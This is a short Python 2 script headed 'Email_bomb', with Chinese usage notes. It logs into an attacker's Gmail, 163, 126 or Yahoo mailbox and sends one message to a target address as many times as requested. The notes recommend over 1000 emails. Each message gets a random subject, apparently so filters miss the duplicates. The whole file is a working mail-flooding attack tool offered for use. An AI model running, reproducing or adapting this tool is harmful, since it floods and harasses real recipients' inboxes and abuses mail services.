#!/usr/bin/python
# -*- coding: latin-1 -*-
print "#############################################################"
print "#  _____                 _ _     _                     _     #"
print "# | ____|_ __ ___   __ _(_) |   | |__   ___  _ __ ___ | |__  #"
print "# |  _| | '_ ` _ \ / _` | | |   | '_ \ / _ \| '_ ` _ \| '_ \ #"
print "# | |___| | | | | | (_| | | |   | |_) | (_) | | | | | | |_) |#"
print "# |_____|_| |_| |_|\__,_|_|_|___|_.__/ \___/|_| |_| |_|_.__/ #"
print "#                         |_____|                            #"
print "##############################################################"
print ""
print "^^^^^^^^^^   http://xiao106347.blog.163.com   ^^^^^^^^^^^^^^^^"
print "> 使用说明 : "
print "> Server Mail: 目前支持：Gmail 163 126 Yahoo "
print "> Username:攻击者邮箱"
print "> Password：攻击者邮箱密码"
print "> To ：输入目标邮箱 "
print "> Message: 内容"
print "> Number of send ：发送炸弹邮件的数量，越多越好，建议1000以上"
print "#-----------------------------------------------------------#"
import os
import smtplib
import getpass
import sys

server = raw_input ('Server Mail: ')
user = raw_input('Username: ')
passwd = getpass.getpass('Password: ')

to = raw_input('\nTo: ')
#subject = raw_input('Subject: ') 
body = raw_input('Message: ')
total = input('Number of send: ')

if server == 'gmail':
 smtp_server = 'smtp.gmail.com'
 port = 587
elif server == '163':
 smtp_server = 'smtp.163.com'
 port = 25
elif server == '126':
 smtp_server = 'smtp.126.com'
 port = 25
elif server == 'yahoo':
 smtp_server = 'smtp.mail.yahoo.com'
 port = 25
else:
 print 'Applies only to gmail and yahoo.'
 sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rTotal emails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
